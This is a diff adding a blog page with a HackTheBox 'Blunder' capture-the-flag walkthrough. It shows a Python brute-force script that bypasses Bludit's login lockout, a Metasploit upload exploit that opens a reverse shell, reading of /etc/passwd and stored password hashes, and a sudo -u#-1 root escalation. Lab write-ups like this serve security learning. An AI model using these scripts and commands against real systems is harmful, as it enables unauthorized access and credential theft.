@@ -1,0 +1,1543 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox Blunder - Dcodezero</title>
+<meta name="description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox Blunder">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Blunder/">
+
+
+  <meta property="og:description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/img/sample/blunder/blunder.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-07-01T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Blunder/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Think I Helped You?</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/blunder/blunder.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox Blunder
+
+        
+      </h1>
+      
+        <p class="page__lead">Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-07-01T00:00:00+05:30">July 1, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          10 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Blunder</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Blunder">
+    <meta itemprop="description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+    <meta itemprop="datePublished" content="2020-07-01T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a></li><li><a href="#gobuster">Gobuster</a></li><li><a href="#viewing-the-custom-passwordlist">viewing the custom passwordlist.</a><ul><li><a href="#as-the-password-list-is-ready-its-time-for-weaponzation">As the Password list is ready, it’s time for weaponzation!</a></li></ul></li><li><a href="#final-crafted-script">Final crafted script………….</a></li><li><a href="#time-to-fire-up-the-bruteforce-script">Time to fire up the bruteforce script..</a><ul><li><a href="#checking-the-credentials-with-the-login-page-works">Checking the credentials with the login page works!</a></li><li><a href="#as-all-the-required-credentials-are-found-its-time-to-step-up-the-game">As all the required credentials are found, its time to step up the game.</a></li><li><a href="#checking-the-users">Checking the Users</a><ul><li><a href="#enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in bl-content/databases.</a></li></ul></li><li><a href="#checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the Users.php found the hash of HUGO.</a></li></ul></li></ul></li><li><a href="#cracking-the-hash-oh-hugo">Cracking the hash oh HUGO!</a></li><li><a href="#logging-in-as-hugo">Logging in as HUGO.</a></li><li><a href="#grabbing-usertxt">Grabbing User.txt</a></li><li><a href="#time-for-privilege-escalation">Time for Privilege Escalation.</a></li><li><a href="#grabbing-roottxt">Grabbing Root.txt</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="lets-get-started">Let’s get started</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -sC -Pn -p- -T4 blunder.htb 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 03:56 EDT
+Nmap scan report for blunder.htb (10.10.10.191)
+Host is up (0.19s latency).
+Not shown: 65533 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 175.80 seconds
+</code></pre></div></div>
+
+<p>Seeing that Port 80 is open, So I need to ennumerate on only one port..</p>
+
+<blockquote>
+  <p>Using some manual enumeration I found the page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> which took me to the <code class="language-plaintext highlighter-rouge">admin</code> page.</p>
+</blockquote>
+
+<p><img src="/assets/img/sample/blunder/blunder2.png" alt="" /></p>
+
+<blockquote>
+  <p>Seeing the name <code class="language-plaintext highlighter-rouge">BLUDIT</code> I searched for an exploit online. <code class="language-plaintext highlighter-rouge"> https://www.exploit-db.com/exploits/47699 </code> and that has a <code class="language-plaintext highlighter-rouge">Metasploit</code> module to it.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
+
+msf5 &gt; search bludit
+
+Matching Modules
+================
+
+#  Name                                          Disclosure Date  Rank       Check  Description
+-  ----                                          ---------------  ----       -----  -----------
+0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find some intersting stuff on the page.</p>
+
+<h2 id="gobuster">Gobuster</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://blunder.htb -x txt -s 200 -w /usr/share/dirb/comm.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://blunder.htb
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/comm.txt
+[+] Status codes:   200
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt
+[+] Timeout:        10s
+===============================================================
+2020/07/05 04:03:42 Starting gobuster
+===============================================================
+/todo.txt (Status: 200)
+===============================================================
+2020/07/05 04:04:26 Finished
+===============================================================
+</code></pre></div></div>
+
+<p>Visiting the page <code class="language-plaintext highlighter-rouge">blunder.htb/todo.txt</code></p>
+
+<p><img src="/assets/img/sample/blunder/blunder1.png" alt="" /></p>
+
+<p>Assuming the username to be <code class="language-plaintext highlighter-rouge">Fergus</code></p>
+
+<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> with the help of <code class="language-plaintext highlighter-rouge">bludit-mitigation-bypass</code>.
+<br /></p>
+
+<p><br /></p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge"> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
+</blockquote>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bludit Mitigation bypass POC
++++++++++++++++++++++++++++++++++
+#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://192.168.194.146/bludit'
+login_url = host + '/admin/login'
+username = 'admin'
+wordlist = []
+
+# Generate 50 incorrect passwords
+for i in range(50):
+    wordlist.append('Password{i}'.format(i = i))
+
+# Add the correct password to the end of the list
+wordlist.append('adminadmin')
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+</code></pre></div></div>
+
+<p>So to do this I made a custom password list <code class="language-plaintext highlighter-rouge">bluditpass.txt</code> using <code class="language-plaintext highlighter-rouge">CEWl</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -d 4 -m 5 -w bluditpass.txt --with-numbers http://blunder.htb 
+CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+</code></pre></div></div>
+
+<h2 id="viewing-the-custom-passwordlist">viewing the custom passwordlist.</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat bluditpass.txt
+Plugins
+service
+Stadia
+devices
+Begin
+Google
+games
+Include
+Cover
+image
+Title
+Creation
+November
+Reading
+minute
+Breaked
+content
+books
+Awards
+Fantasy
+National
+button
+players
+allows
+stream
+Dynamic
+blunder
+interesting
+facts
+About
+Stephen
+American
+fiction
+novels
+which
+feature
+series
+published
+received
+World
+awarded
+Medal
+created
+literature
+Award
+range
+centers
+through
+smartphones
+tablets
+state
+users
+library
+their
+other
+title
+Blunder
+description
+Favicon
+Bootstrap
+bootstrap
+Styles
+theme
+Robots
+plugin
+Navbar
+Static
+pages
+Social
+Networks
+Content
+Posts
+Edwin
+September
+author
+horror
+supernatural
+suspense
+fantasy
+million
+copies
+adapted
+films
+miniseries
+television
+comic
+including
+seven
+under
+Richard
+Bachman
+written
+approximately
+short
+stories
+collections
+Stoker
+British
+Society
+Foundation
+Distinguished
+Contribution
+Letters
+probably
+fictional
+character
+RolandDeschain
+tower
+awards
+contribution
+entire
+oeuvre
+Achievement
+Grand
+Master
+Mystery
+Writers
+America
+United
+States
+Endowment
+contributions
+described
+Horror
+cloud
+gaming
+operated
+capable
+streaming
+video
+resolution
+frames
+second
+support
+dynamic
+company
+numerous
+across
+globe
+provided
+using
+sufficiently
+speed
+Internet
+connection
+accessible
+Chrome
+browser
+desktop
+computers
+smart
+televisions
+digital
+media
+Chromecast
+integrated
+YouTube
+share
+viewers
+launch
+streamer
+selling
+point
+compatible
+class
+controllers
+though
+proprietary
+controller
+manufactured
+direct
+available
+alongside
+similar
+Netflix
+requires
+purchase
+rather
+access
+While
+monthly
+subscription
+higher
+rates
+larger
+resolutions
+offer
+Short
+universal
+serial
+pronounced
+interface
+computer
+communicate
+peripheral
+connected
+cover
+broad
+anything
+keyboards
+music
+flash
+drives
+information
+these
+section
+power
+certain
+charge
+batteries
+first
+commercial
+release
+Universal
+Serial
+version
+January
+industry
+standard
+quickly
+adopted
+Intel
+Compaq
+Microsoft
+companies
+Pagination
+Right
+Sidebar
+files
+nothing
+Footer
+Copyright
+2019Powered
+byEgotisticalSW
+Javascript
+HackTheBox
+</code></pre></div></div>
+
+<h3 id="as-the-password-list-is-ready-its-time-for-weaponzation">As the Password list is ready, it’s time for weaponzation!</h3>
+
+<h2 id="final-crafted-script">Final crafted script………….</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+import re
+import requests
+#from __future__ import print_function
+
+def open_ressources(file_path):
+    return [item.replace("\n", "") for item in open(file_path).readlines()]
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+wordlist = open_ressources('bluditpass.txt')
+
+'''# Generate 50 incorrect passwords
+for i in range(50):
+    wordlist.append('Password{i}'.format(i = i))
+
+# Add the correct password to the end of the list
+wordlist.append('adminadmin')
+'''
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+</code></pre></div></div>
+
+<h2 id="time-to-fire-up-the-bruteforce-script">Time to fire up the bruteforce script..</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bluditbrute.py 
+[*] Trying: Plugins
+[*] Trying: service
+[*] Trying: Stadia
+[*] Trying: devices
+[*] Trying: Begin
+[*] Trying: Google
+[*] Trying: games
+[*] Trying: Include
+[*] Trying: Cover
+[*] Trying: image
+[*] Trying: Title
+[*] Trying: Creation
+[*] Trying: November
+[*] Trying: Reading
+[*] Trying: minute
+[*] Trying: Breaked
+[*] Trying: content
+[*] Trying: books
+[*] Trying: Awards
+[*] Trying: Fantasy
+[*] Trying: National
+[*] Trying: button
+[*] Trying: players
+[*] Trying: allows
+[*] Trying: stream
+[*] Trying: Dynamic
+[*] Trying: blunder
+[*] Trying: interesting
+[*] Trying: facts
+[*] Trying: About
+[*] Trying: Stephen
+[*] Trying: American
+[*] Trying: fiction
+[*] Trying: novels
+[*] Trying: which
+[*] Trying: feature
+[*] Trying: series
+[*] Trying: published
+[*] Trying: received
+[*] Trying: World
+[*] Trying: awarded
+[*] Trying: Medal
+[*] Trying: created
+[*] Trying: literature
+[*] Trying: Award
+[*] Trying: range
+[*] Trying: centers
+[*] Trying: through
+[*] Trying: smartphones
+[*] Trying: tablets
+[*] Trying: state
+[*] Trying: users
+[*] Trying: library
+[*] Trying: their
+[*] Trying: other
+[*] Trying: title
+[*] Trying: Blunder
+[*] Trying: description
+[*] Trying: Favicon
+[*] Trying: Bootstrap
+[*] Trying: bootstrap
+[*] Trying: Styles
+[*] Trying: theme
+[*] Trying: Robots
+[*] Trying: plugin
+[*] Trying: Navbar
+[*] Trying: Static
+[*] Trying: pages
+[*] Trying: Social
+[*] Trying: Networks
+[*] Trying: Content
+[*] Trying: Posts
+[*] Trying: Edwin
+[*] Trying: September
+[*] Trying: author
+[*] Trying: horror
+[*] Trying: supernatural
+[*] Trying: suspense
+[*] Trying: fantasy
+[*] Trying: million
+[*] Trying: copies
+[*] Trying: adapted
+[*] Trying: films
+[*] Trying: miniseries
+[*] Trying: television
+[*] Trying: comic
+[*] Trying: including
+[*] Trying: seven
+[*] Trying: under
+[*] Trying: Richard
+[*] Trying: Bachman
+[*] Trying: written
+[*] Trying: approximately
+[*] Trying: short
+[*] Trying: stories
+[*] Trying: collections
+[*] Trying: Stoker
+[*] Trying: British
+[*] Trying: Society
+[*] Trying: Foundation
+[*] Trying: Distinguished
+[*] Trying: Contribution
+[*] Trying: Letters
+[*] Trying: probably
+[*] Trying: fictional
+[*] Trying: character
+[*] Trying: RolandDeschain
+
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
+</blockquote>
+
+<h4 id="checking-the-credentials-with-the-login-page-works">Checking the credentials with the login page works!</h4>
+
+<p><img src="/assets/img/sample//blunder/blunder3.png" alt="" /></p>
+
+<h4 id="as-all-the-required-credentials-are-found-its-time-to-step-up-the-game">As all the required credentials are found, its time to step up the game.</h4>
+
+<p>Using <code class="language-plaintext highlighter-rouge">metasploit</code> to get the initial foothold.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
+
+msf5 &gt; search bludit
+
+Matching Modules
+================
+
+#  Name                                          Disclosure Date  Rank       Check  Description
+-  ----                                          ---------------  ----       -----  -----------
+0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+
+
+msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts blunder.htb
+rhosts =&gt; blunder.htb
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost tun0
+lhost =&gt; tun0
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus
+bludituser =&gt; fergus
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain
+bluditpass =&gt; RolandDeschain
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
+</code></pre></div></div>
+
+<p>If the config is set correctly then there should be no problem of getting the <code class="language-plaintext highlighter-rouge">meterpreter</code> session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.51:4444 
+[+] Logged in as: fergus
+[*] Retrieving UUID...
+[*] Uploading KtkujjMWRu.png...
+[*] Uploading .htaccess...
+[*] Executing KtkujjMWRu.png...
+[*] Sending stage (38288 bytes) to 10.10.10.191
+[*] Meterpreter session 1 opened (10.10.14.51:4444 -&gt; 10.10.10.191:60776) at 2020-07-05 05:10:52 -0400
+[+] Deleted .htaccess
+
+meterpreter &gt; shell
+Process 8846 created.
+Channel 0 created.
+python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
+</code></pre></div></div>
+
+<h4 id="checking-the-users">Checking the Users</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat /etc/passwd
+
+shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
+hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
+</code></pre></div></div>
+
+<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code class="language-plaintext highlighter-rouge">bl-content/databases</code>.</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www$ cd bludit-3.10.0a
+cd bludit-3.10.0a
+www-data@blunder:/var/www/bludit-3.10.0a$ ls
+ls
+LICENSE    bl-content  bl-languages  bl-themes  install.php
+README.md  bl-kernel   bl-plugins    index.php
+www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content
+cd bl-content
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls
+ls
+databases  pages  tmp  uploads  workspaces
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases
+cd databases
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
+ls
+categories.php  plugins       site.php    tags.php
+pages.php       security.php  syslog.php  users.php
+</code></pre></div></div>
+
+<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code class="language-plaintext highlighter-rouge">Users.php</code> found the hash of <code class="language-plaintext highlighter-rouge">HUGO</code>.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+cat users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+</code></pre></div></div>
+
+<h2 id="cracking-the-hash-oh-hugo">Cracking the hash oh HUGO!</h2>
+
+<p><img src="/assets/img/sample//blunder/blunder4.png" alt="" /></p>
+
+<h2 id="logging-in-as-hugo">Logging in as HUGO.</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/home$ su hugo
+su hugo
+Password: Password120
+hugo@blunder:~$
+</code></pre></div></div>
+
+<h2 id="grabbing-usertxt">Grabbing User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ cat user.txt
+cat user.txt
+d******************************a
+</code></pre></div></div>
+
+<h2 id="time-for-privilege-escalation">Time for Privilege Escalation.</h2>
+
+<p>Checking the sudo permissions of <code class="language-plaintext highlighter-rouge">hugo</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+</code></pre></div></div>
+
+<blockquote>
+  <p>Escalation of privilege is so simple and stright forward!</p>
+</blockquote>
+
+<p><br /></p>
+
+<blockquote>
+  <p>https://www.hackingarticles.in/category/privilege-escalation/</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$  sudo -u#-1 /bin/bash 
+
+root@blunder:/# whoami
+whoami
+root
+</code></pre></div></div>
+
+<h2 id="grabbing-roottxt">Grabbing Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@blunder:/root# cat root.txt
+cat root.txt
+8******************************f
+</code></pre></div></div>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
